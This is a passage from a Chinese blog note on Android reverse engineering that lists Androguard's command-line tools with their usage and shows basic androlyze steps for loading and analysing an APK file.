title="终止程序"></a>终止程序</h4><ul><li><p>Context的finish()方法</p></li><li><p>android.os.Process的killProcess()方法</p></li></ul><h3 id="Androguard简单使用"><a href="#Androguard简单使用" class="headerlink" title="Androguard简单使用"></a>Androguard简单使用</h3><ul><li><a href="http://androapkinfo.py/">androapkinfo.py</a><br>查看apk信息。包、资源、权限、组件、方法。<br>androapkinfo -i filename</li><li><a href="http://androaxml.py/">androaxml.py</a><br>解析AndroidManifest.xml文件。<br>androaxml -i filename</li><li><a href="http://androcsign.py/">androcsign.py</a><br>收集签名到数据库中，使用前需要为apk编写sign文件。</li><li><a href="http://androdd.py/">androdd.py</a><br>生成apk每个类的方法的调用流程图。<br>androdd -i filename -o dirname -d -f PNG<br>-d 是指定生成dot图形文件。</li><li><a href="http://androdiff.py/">androdiff.py</a><br>比较两个apk文件的差异。<br>androdiff -i filename1 filename2</li><li><a href="http://androdump.py/">androdump.py</a><br>dump一个Linux进程。<br>androdump -i pid</li><li><a href="http://androgexf.py/">androgexf.py</a><br>生成一个gexf图形文件。用Gephi查看。<br>androgexf -i filename1 -o filename2</li><li><a href="http://androlyze.py/">androlyze.py</a><br>提供交互环境静态分析android程序。</li><li><a href="http://andromercury.py/">andromercury.py</a><br>Mercury工具的框架。</li><li><a href="http://androrisk.py/">androrisk.py</a><br>评估apk文件中的潜在方法。<br>androrisk -m -i filename<br>m 表示需要分析每一个方法。</li><li><a href="http://androsign.py/">androsign.py</a><br>检测签名是否存于数据库，与androcsign作用相反。<br><img src="/2020/03/10/Android%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20200310102455464.png" alt="image-20200310102455464"></li><li><a href="http://androsim.py/">androsim.py</a><br>计算两个apk文件的相似度。<br>androsim -i filename1 filename2</li><li><a href="http://androxgmml.py/">androxgmml.py</a><br>生成jar/class/apk/dex文件的控制流程及功能调度图，输出格式为xgmml。<br>androxgmml -i filename -o *.xgmml</li><li><a href="http://apkviewer.py/">apkviewer.py</a><br>为每一个类生成一个独立的graphml图形文件。<br>apkviewer -i filename -o xxx</li></ul><h3 id="androlyze的简单使用"><a href="#androlyze的简单使用" class="headerlink" title="androlyze的简单使用"></a>androlyze的简单使用</h3><p>androlyze -s //获取交互命令行模式</p><ol><li>获取apk文件对象<br>a = APK(“filename”)</li><li>获取dex文件对象<br>d = DalvikVMFormat(a.get_dex())</li><li>获取分析结果对象<br>dx = VMAnalysis(d)</li><li>三合一指令<br>a, d, dx = APK(“filename”, decompiler=”dad”)<br>decompiler指定反编译器名称。</li></ol>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
      <category>Android逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
